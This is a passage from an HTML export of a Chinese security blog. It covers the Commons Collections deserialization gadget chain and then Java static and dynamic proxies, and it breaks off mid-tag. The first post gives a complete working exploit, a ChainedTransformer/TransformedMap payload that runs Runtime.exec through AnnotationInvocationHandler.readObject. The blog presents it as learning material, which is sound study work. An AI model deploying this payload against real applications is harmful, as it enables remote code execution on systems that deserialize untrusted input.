class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException {</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//var2代表AnnotationType（注释类型） -》 为空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个实例</span></span><br><span class="line">        } <span class="keyword">catch</span> (IllegalArgumentException var9) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();<span class="comment">//*****var4会直接将memberValues自身作为parent传入，和第五步我们自己构造的一模一样！！！如果没看懂的，建议看第五步仔细阅读。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) {<span class="comment">//如果var4中还有下一个key-Value对</span></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个key-value对，并赋值给var5</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) {<span class="comment">//如果var3中有这个key</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) {</span><br><span class="line">                    <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，call var5(Map)的setValue()方法</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>我们看到了熟悉的<code>this.memberValues.entrySet().iterator();</code>，在后面还有<code>setValue()</code>，这已经足够我们利用了。上面代码<code>comment</code>中的<code>【this.type】</code>和<code>【this.memberValues】</code>都是可控的,在构造方法中可以传入，那么顺便看看其构造方法源码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) {</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) {</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>memberValues</code>我们赋值为<code>TransformedMap.decorate()</code>的返回值，那<code>type</code>呢？我们可以发现<code>type</code>是一种<code>Annotation</code>（注释），如果大家有学习过<code>SpringBoot或Spring</code>的话，就会理解<code>Annotation</code>的意义。所以此处我们是要传一个Annotation的Class过去。再看<code>readObject()</code>中的逻辑：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">          ...</span><br><span class="line">var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个Annotation实例（实际会获取到注解的各种属性，包括注解元素，注解元素的默认值，生命周期，是否继承等等。）</span></span><br><span class="line">      <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">      <span class="keyword">while</span>(var4.hasNext()) {</span><br><span class="line">          <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个entry</span></span><br><span class="line">          <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">          <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3 memberTypes中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">          <span class="keyword">if</span> (var7 != <span class="literal">null</span>) {<span class="comment">//如果var3 memberTypes中有这个key</span></span><br><span class="line">              <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">              <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) {</span><br><span class="line">                  <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，触发漏洞</span></span><br><span class="line">                  var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">              }</span><br><span class="line">          }</span><br><span class="line">      }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>我们传入的这个type需要有<code>memberTypes</code>，且我们的<strong>map</strong>中的key必须要和<code>memberTypes</code>的key保持**一致。**跟踪<code>Annotation</code>这个<code>Class</code>，我们可以发现所有<code>Annotation</code>的<code>class。</code></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121171552950.png" alt="所有的Annotation的class文件"></p><p>这里我们可以简单分析一下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target {</span><br><span class="line">    ElementType[] value();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此处<code>Target</code>的<code>memberTypes</code>就是 <code>[value:ElementType]</code> =》 <strong>key-value</strong>的形式。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention {</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此处<code>Retention</code>的<code>memberTypes</code>就是 <code>[value:RetentionPolicy]</code> =》 <strong>key-value</strong>的形式`。</p><p>这些<code>Annotation</code>的元注解都可以通过<code>@</code>符号来调用，例如<code>@Target</code></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20210731232549977.png" alt="@Target"></p><p>因此我们可以选择传入<code>Target.class</code>或者<code>Retention.class</code>, <code>map</code>的<code>key</code>值为<code>value</code>。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"anyContent"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<span class="comment">//反射获取该类</span></span><br><span class="line">        Constructor&lt;?&gt; aConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<span class="comment">//获取构造方法</span></span><br><span class="line">        aConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消构造方法限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aConstructor.newInstance(Target.class, myMap);<span class="comment">//传入参数和malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//触发漏洞</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最后成功弹出计算器</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>在学习利用链之前我总是在想，为啥大佬们要大费周章花很多心思来搞这么长的利用链？学完CC链的原理之后我明白了，在构造利用链时，他们肯定是在一步一步思索，怎么才能使漏洞的利用需要的条件更低，而接触范围更大等等，解决的办法也就是不断寻找其他突破口，去看其他的类，其他的方法来曲线救国，我想这也是我们在平常学习安全时所需要的能力，要学会不断去探索新的方法、新的可能性。</p><p><em><strong>参考文章：</strong></em></p><p>Java安全漫谈</p><p> <a href="https://xz.aliyun.com/t/7031">JAVA反序列化 - Commons-Collections组件</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java动态代理机制</title>
      <link href="/2024/01/16/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/01/16/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在之前讲RMI的笔记中，我都会涉及到代理这个概念，比如stub(存根)和skeleton(骨架)，stub是远程对象在rmi client端的代理，而skeleton则是rmi server端的代理，skeleton用来处理stub发送来的请求，然后去调用客户端需要的请求方法，最终将方法执行结果返回给stub。这里其实涉及到的java的动态代理的机制，感觉不去了解这个机制总觉得很抽象，这篇文章特地来说说java的这个动态代理机制。</p><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>代理模式是一种java的设计模式，能够使得在不修改源目标的前提下，额外扩展源目标的功能。即通过访问源目标的代理类，再由代理类去访问源目标。这样一来，要扩展功能，就无需修改源目标的代码了，只需要在代理类上增加就可以了。</p><p>代理模式设计特征主要为一个接口以及实现这个接口的委托类和代理类，委托类实现基本的功能，即接口中的所有方法，一些额外要实现的功能都委托给代理类处理，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。</p><p>java的代理机制又分为静态代理和动态代理，这里我们重点掌握java自带的jdk动态代理机制。</p><h2 id="0x02-静态代理"><a href="#0x02-静态代理" class="headerlink" title="0x02 静态代理"></a>0x02 静态代理</h2><p>我们先从相对简单的静态代理开始了解，以便更好地明白代理的概念，以及为啥需要动态代理。</p><p>先以经纪人为明星代理为例：</p><p>先定义一个接口，便于明星和经纪人来实现其中的唱歌、跳舞功能：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Star_impl</span> {</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sing</span><span class="params">(String song)</span>;</span><br><span class="line">    String <span class="title function_">dance</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后定义一个明星类，即委托类，实现这个接口的所有方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Star</span> <span class="keyword">implements</span> <span class="title class_">Star_impl</span>{</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Star</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sing</span><span class="params">(String song)</span>{</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">"正在唱"</span> + song);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">dance</span><span class="params">()</span>{</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">"正在跳舞。"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"感谢各位！"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再定义一个经纪人类，即代理类，负责帮忙实现委托类不能实现的一些操作，比如准备话筒、舞台等。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Broker</span> <span class="keyword">implements</span> <span class="title class_">Star_impl</span>{</span><br><span class="line">    <span class="keyword">private</span> Star_impl target; <span class="comment">//被代理对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Broker</span><span class="params">(Star_impl target)</span> {</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    }</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sing</span><span class="params">(String song)</span>{</span><br><span class="line">        System.out.println(<span class="string">"准备话筒"</span>); <span class="comment">// 添加自定义的委托逻辑</span></span><br><span class="line">        target.sing(song); <span class="comment">//调用委托类Star的基本方法</span></span><br><span class="line">    }</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">dance</span><span class="params">()</span>{</span><br><span class="line">        System.out.println(<span class="string">"准备舞台"</span>);</span><br><span class="line">        <span class="keyword">return</span> target.dance();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>main函数看看效果：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Star_impl subject)</span>{</span><br><span class="line">        subject.sing();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Star_impl</span> <span class="variable">star</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Star</span>(<span class="string">"一个不知名歌手"</span>); <span class="comment">//获取委托类的实例对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">song</span> <span class="operator">=</span> <span class="string">"一个不知名的歌曲"</span>;</span><br><span class="line">        System.out.println(<span class="string">"-----使用代理之前-----"</span>);</span><br><span class="line">        start(star, song);</span><br><span class="line">        System.out.println(<span class="string">"-----使用静态代理之后-----"</span>);</span><br><span class="line">        start(<span class="keyword">new</span> <span class="title class_">Broker</span>(star), song);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240120234536512.png" alt="结果"></p><p>可以看到，我们能够在不修改Star类(即委托类)的源码的前提下，通过Broker类(即代理类)扩展Star类的功能，从而实现代理功能。在使用代理后，布置舞台、收钱的功能实现了，歌手可以放心唱歌了。</p><p>这样看来，静态代理很轻松就实现了代理功能，那为啥我们还需要引入动态代理？</p><p>试想一下，如果我们需要实现更多额外的功能，那可能会需要编写更多的代理类，这时当原来的那个接口的源码需要修改一些东西时，那委托类和这些代理类都要进行相应修改，这显然是不容易维护的。另外，我们要代理的类可能不止一个，当需要代理多个类时，每个委托类都要编写相应的代理类，这又会导致代理更多，更不容易维护。</p><p>java静态代理是对类进行操作的，我们需要一个个代理类去实现对委托类的更改操作，主要的缺点就是维护难的问题。针对这种情况，我们可以用动态代理来解决，通过程序运行时自动生成代理类。</p><h2 id="0x03-动态代理"><a href="#0x03-动态代理" class="headerlink" title="0x03 动态代理"></a>0x03 动态代理</h2><p>动态代理利用了JDK API，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。</p><p>静态代理与动态代理的区别主要在：</p><ul><li>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件</li><li>动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</li></ul><p>学习反射时我们就涉及过<code>java.lang.reflect</code>这个包，关于java的动态代理，也是要用到这个包下的这两位：<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口，通过这它们并配合反射机制，就可以实现动态代理。</p><h3 id="java-lang-reflect-InvocationHandler接口"><a href="#java-lang-reflect-InvocationHandler接口" class="headerlink" title="java.lang.reflect.InvocationHandler接口"></a>java.lang.reflect.InvocationHandler接口</h3><p>InvocationHandler接口：负责提供调用代理操作。是由代理对象调用处理器实现的接口，定义了一个<code>invoke()</code>方法，每个代理对象都有一个关联的接口。</p><p>这里的<code>invoke()</code>是关键，当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。所以我们可以通过重写<code>invoke()</code>方法达到修改委托类对应功能的目的。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     略</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>invoke()</code>需要传入的三个参数的含义：</p><p>Object proxy，当前代理对象。</p><p>Method method, 当前调用的方法的Method对象，比如代理对象调用sing方法，这里就会传入sing的Method对象。</p><p>Object[] args，当前调用的方法需要传入的所有参数，比如sing方法要传入song这个参数。</p><h3 id="java-lang-reflect-Proxy类"><a href="#java-lang-reflect-Proxy类" class="headerlink" title="java.lang.reflect.Proxy类"></a>java.lang.reflect.Proxy类</h3><p>Proxy类：负责动态构建代理类，提供四个静态方法来为一组接口动态生成的代理类并返回代理类的实例对象。</p><p>四个静态方法如下：</p><table><thead><tr><th>静态方法名</th><th>作用</th></tr></thead><tbody><tr><td>getProxyClass(ClassLoader,Class&lt;?&gt;…)</td><td>获取指定类加载器和动态代理类对象。</td></tr><tr><td>newProxyInstance(ClassLoader,Class&lt;?&gt;[],InvocationHandler)</td><td>指定类加载器，一组接口，调用处理器。</td></tr><tr><td>isProxyClass(Class&lt;?&gt;)</td><td>判断获取的类是否为一个动态代理类。</td></tr><tr><td>getInvocationHandler(Object)</td><td>获取指定代理类实例查找与它相关联的调用处理器实例。</td></tr></tbody></table><h3 id="实现"><a href="#实现" class="headerlink" 